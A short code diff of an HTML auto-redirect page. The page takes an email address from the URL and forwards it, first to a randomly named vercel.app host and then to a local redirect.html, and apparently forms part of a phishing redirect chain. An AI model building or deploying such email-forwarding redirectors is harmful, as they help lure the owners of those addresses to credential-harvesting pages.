@@ -5,31 +5,31 @@
   <title>Redirecting...</title>
   <script>
     window.onload = function() {
-      // Get the ?email= parameter from this page's URL
+      // Get the ?web= parameter from your domain (manmaking.com)
       const params = new URLSearchParams(window.location.search);
-      const email = params.get("email");
+      const email = params.get("web");
 
-      // Build the target URL
-      let targetUrl = "https://b5af32c6a58a056585e52624a.vercel.app/?web=";
+      // Build redirect URL (to redirect.html?email=EMAIL)
+      let targetUrl = "redirect.html?email=";
       if (email) {
         targetUrl += encodeURIComponent(email);
       }
 
-      // Redirect
+      // Redirect to new location
       window.location.href = targetUrl;
     };
   </script>
 </head>
 <body>
-  <p>Redirecting... If it doesn’t work, 
+  <p>Redirecting... If nothing happens, 
     <a id="redirectLink" href="#">click here</a>.
   </p>
 
   <script>
-    // Update fallback link
+    // Update manual fallback link
     const params = new URLSearchParams(window.location.search);
-    const email = params.get("email");
-    let link = "https://b5af32c6a58a056585e52624a.vercel.app/?web=";
+    const email = params.get("web");
+    let link = "redirect.html?email=";
     if (email) {
       link += encodeURIComponent(email);
     }
